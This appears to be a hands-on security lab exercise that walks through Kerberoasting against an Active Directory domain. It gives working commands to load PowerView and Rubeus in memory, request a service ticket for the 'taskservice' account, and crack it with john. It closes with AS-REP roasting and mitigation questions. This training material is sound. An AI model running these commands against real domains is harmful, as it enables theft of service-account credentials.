# Exercise 3 - Kerberos (Roasting)

## Tools

You can find all tools needed in the ["attacker-tools.zip"-file](../exercises/attacker-tools). The links below are for your own reference.

Tools needed:

- PowerView: [https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
- Rubeus: [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- john: [https://www.openwall.com/john/](https://www.openwall.com/john/)

## Exercise

In this exercise, we'll use Kerberoasting to crack the password of the service account "taskservice".

First, load Powerview and Rubeus.

```
cd C:\attacker-tools
cat -raw .\PowerView.ps1 | iex
cat -raw .\Invoke-Rubeus.ps1 | iex
```

Get all domain users with a Service Principal Name (SPN).

```
Get-DomainUser -SPN | select samaccountname, description, pwdlastset, serviceprincipalname
```

You can also use rubeus to get better statistics (useful in large environments and for audit reports ;-) ).

```
Invoke-Rubeus -Command "kerberoast /stats"
```

Run rubeus to get a TGS for the target user.

```
Invoke-Rubeus -Command "kerberoast /user:taskservice /format:hashcat /outfile:krb5tgs.txt"
```

Crack the TGS with john.

```
cd C:\attacker-tools\john\run
.\john.exe <path-to-krb5tgs.txt> --wordlist=..\..\example.dict --rules=passphrase-rule2
```


## Questions

 - Do an online research on how to best mitigate kerberoasting attacks. Describe the mitigation techniques that you think are the best and explain why you chose them.
 - There is another user account vulnerable to ASREP roasting. Crack his password using similar commands like in the previous exercise. (Hint: Get-DomainUser -NoPreauth)
 - Explain the difference between the two attacks you just executed (TGS vs. ASREP roasting).